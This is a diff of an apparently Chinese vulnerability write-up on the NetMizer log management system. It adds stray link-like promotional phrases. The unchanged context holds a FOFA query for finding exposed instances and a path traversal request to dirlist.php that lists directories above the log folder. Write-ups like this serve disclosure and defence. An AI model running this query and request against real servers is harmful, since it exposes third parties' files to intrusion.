@@ -12,6 +12,14 @@ NetMizer日志管理系统是一款用于网络流量管理和优化的日志记
 
 老旧版本
 
+深入探索
+
+防火墙软件
+
+网络安全培训
+
+Docker加速服务
+
 # fofa语法
 
 `body="日志管理系统" && body="NetMizer"`
@@ -101,6 +109,8 @@ NetMizer日志管理系统是一款用于网络流量管理和优化的日志记
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
+
+漏洞预警服务
 
 ```
 GET /data/manage/dirlist.php?node=/home/lingzhou/NMLog/../../../ HTTP/1.1
